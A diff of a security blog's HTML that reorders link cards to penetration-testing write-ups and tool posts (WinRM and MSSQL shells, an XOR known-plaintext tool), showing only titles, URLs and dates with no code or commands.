@@ -1506,92 +1598,16 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1614,72 +1630,20 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1717,6 +1681,66 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
           
            
            
@@ -1766,6 +1790,8 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
           
+          
+           
            
            
            
@@ -1773,11 +1799,17 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
+           
+          
+           
+           
+           
+           
           
            
            
            
-          
+           
           
            
            
@@ -1814,150 +1846,20 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
@@ -2135,22 +2037,6 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
-      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Apr 2018</time>
-      <time lang="el">22 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -2340,108 +2226,6 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
-      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 Apr 2018</time>
-      <time lang="el">13 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -2568,6 +2352,249 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
